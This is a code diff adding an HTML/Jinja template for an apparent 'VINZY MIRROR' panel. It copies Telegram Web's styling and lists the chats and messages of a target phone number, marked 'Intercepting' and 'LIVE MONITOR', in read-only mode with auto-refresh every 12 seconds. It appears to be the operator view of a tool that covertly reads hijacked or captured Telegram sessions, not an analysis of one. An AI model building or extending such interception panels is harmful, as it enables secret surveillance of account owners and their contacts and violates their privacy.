@@ -1,1 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Telegram Web | Mirror Session</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+    
+    <link rel="stylesheet" href="https://web.telegram.org/k/index-q1C_GO8L.css">
+    
+    <style>
+        /* Mirror Overlay & Custom Controls */
+        :root {
+            --mirror-accent: #3390ec;
+            --mirror-bg: #0f0f0f;
+        }
 
+        body.has-auth-pages {
+            background-color: var(--mirror-bg) !important;
+            display: flex !important;
+            flex-direction: row !important;
+        }
+
+        #mirror-sidebar {
+            width: 380px;
+            height: 100vh;
+            border-right: 1px solid rgba(255,255,255,0.1);
+            background: #1c1c1c;
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+            z-index: 10;
+        }
+
+        .mirror-header {
+            padding: 12px 20px;
+            background: var(--mirror-accent);
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-weight: 500;
+        }
+
+        .live-indicator {
+            background: #ff3b30;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 10px;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink { 50% { opacity: 0.3; } }
+
+        .chat-item-mirror {
+            padding: 10px 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .chat-item-mirror:hover { background: rgba(255,255,255,0.05); }
+        .chat-item-mirror.active { background: rgba(51, 144, 236, 0.15); border-left: 3px solid var(--mirror-accent); }
+
+        .avatar-mock {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #64b5f6, #1e88e5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+            flex-shrink: 0;
+        }
+
+        .chat-info { overflow: hidden; }
+        .chat-title { font-weight: 600; font-size: 15px; white-space: nowrap; text-overflow: ellipsis; }
+        .chat-preview { font-size: 13px; color: #aaaaaa; white-space: nowrap; text-overflow: ellipsis; }
+
+        #mirror-main {
+            flex-grow: 1;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: #000;
+            position: relative;
+        }
+
+        .msg-container {
+            flex-grow: 1;
+            padding: 20px;
+            overflow-y: auto;
+            background-image: url('https://web.telegram.org/k/assets/img/bg-dark.png');
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .msg-bubble {
+            max-width: 65%;
+            padding: 8px 12px;
+            border-radius: 12px;
+            font-size: 14.5px;
+            position: relative;
+            line-height: 1.4;
+        }
+
+        .msg-bubble.in { background: #212121; align-self: flex-start; border-bottom-left-radius: 4px; }
+        .msg-bubble.out { background: #2b5278; align-self: flex-end; border-bottom-right-radius: 4px; }
+        
+        .msg-time {
+            font-size: 10px;
+            color: rgba(255,255,255,0.5);
+            text-align: right;
+            margin-top: 4px;
+        }
+
+        .target-bar {
+            padding: 10px 20px;
+            background: rgba(30,30,30,0.95);
+            border-bottom: 1px solid #333;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+    </style>
+</head>
+<body class="animation-level-2 has-auth-pages dark-mode">
+
+    <svg style="position: absolute; width: 0; height: 0;">
+      <defs>
+        <path id="logo" d="M80,0 C124.18278,0 160,35.81722 160,80 C160,124.18278 124.18278,160 80,160 C35.81722,160 0,124.18278 0,80 C0,35.81722 35.81722,0 80,0 Z M114.262551,46.4516129 L114.123923,46.4516129 C111.089589,46.5056249 106.482806,48.0771432 85.1289541,56.93769 L81.4133571,58.4849956 C72.8664779,62.0684477 57.2607933,68.7965125 34.5963033,78.66919 C30.6591745,80.2345564 28.5967328,81.765936 28.4089783,83.2633288 C28.0626453,86.0254269 31.8703852,86.959903 36.7890378,88.5302703 L38.2642674,89.0045258 C42.3926354,90.314406 47.5534685,91.7248852 50.3250916,91.7847532 C52.9151948,91.8407003 55.7944784,90.8162976 58.9629426,88.7115451 L70.5121776,80.9327422 C85.6657026,70.7535853 93.6285785,65.5352892 94.4008055,65.277854 L94.6777873,65.216416 C95.1594319,65.1213105 95.7366278,65.0717596 96.1481181,65.4374337 C96.6344248,65.8695939 96.5866185,66.6880224 96.5351057,66.9075859 C96.127514,68.6448691 75.2839361,87.6143392 73.6629144,89.2417998 L73.312196,89.6016896 C68.7645143,94.2254793 63.9030972,97.1721503 71.5637945,102.355193 L73.3593638,103.544598 C79.0660342,107.334968 82.9483395,110.083813 88.8107882,113.958377 L90.3875424,114.996094 C95.0654739,118.061953 98.7330313,121.697601 103.562866,121.253237 C105.740839,121.052855 107.989107,119.042224 109.175465,113.09692 L109.246762,112.727987 C112.002037,98.0012935 117.417883,66.09303 118.669527,52.9443975 C118.779187,51.7924073 118.641237,50.318088 118.530455,49.6708963 L118.474159,49.3781963 C118.341081,48.7651315 118.067967,48.0040758 117.346762,47.4189793 C116.412565,46.6610871 115.002114,46.4638844 114.262551,46.4516129 Z"/>
+      </defs>
+    </svg>
+
+    <div id="mirror-sidebar">
+        <div class="mirror-header">
+            <span>VINZY MIRROR</span>
+            <span class="live-indicator">LIVE MONITOR</span>
+        </div>
+        <div style="overflow-y: auto; flex-grow: 1;">
+            {% for chat in chats %}
+            <div class="chat-item-mirror {% if chat.id|string == active_id|string %}active{% endif %}" 
+                 onclick="location.href='/mirror/{{ phone }}/{{ chat.id }}'">
+                <div class="avatar-mock">{{ chat.title[0]|upper }}</div>
+                <div class="chat-info">
+                    <div class="chat-title">{{ chat.title }}</div>
+                    <div class="chat-preview">{{ chat.last_msg }}</div>
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+
+    <div id="mirror-main">
+        <div class="target-bar">
+            <div class="avatar-mock" style="width:40px; height:40px; font-size:14px;">{{ active_chat_name[0]|upper }}</div>
+            <div>
+                <div style="font-weight: 600;">{{ active_chat_name }}</div>
+                <div style="font-size: 11px; color: #3390ec;">Intercepting: +{{ phone }}</div>
+            </div>
+        </div>
+
+        <div class="msg-container">
+            {% for msg in messages %}
+            <div class="msg-bubble {% if msg.out %}out{% else %}in{% endif %}">
+                {{ msg.text }}
+                <div class="msg-time">{{ msg.time }}</div>
+            </div>
+            {% endfor %}
+        </div>
+        
+        <div style="padding: 15px; background: #1c1c1c; color: #555; text-align: center; font-size: 13px; font-style: italic;">
+            Reading Session Mode - User Input Disabled
+        </div>
+    </div>
+
+    <script>
+        // Refresh every 12 seconds to check for new messages without crashing session
+        setTimeout(() => {
+            location.reload();
+        }, 12000);
+
+        // Keep scroll at bottom
+        const container = document.querySelector('.msg-container');
+        container.scrollTop = container.scrollHeight;
+    </script>
+</body>
+</html>
